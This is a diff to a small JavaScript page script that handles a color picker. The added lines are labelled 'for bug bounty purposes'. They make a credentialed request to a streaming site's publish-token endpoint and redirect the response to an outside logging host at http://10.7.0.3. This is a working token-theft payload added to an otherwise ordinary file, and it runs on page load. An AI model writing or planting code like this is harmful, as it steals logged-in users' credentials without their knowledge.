@@ -7,3 +7,15 @@ function magic() {
 }
 
 color.addEventListener("input", magic);
+
+/* this is for bug bounty purposes */
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://kick.com/stream/publish_token',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='http://10.7.0.3/=/log?key='+this.responseText;
+};
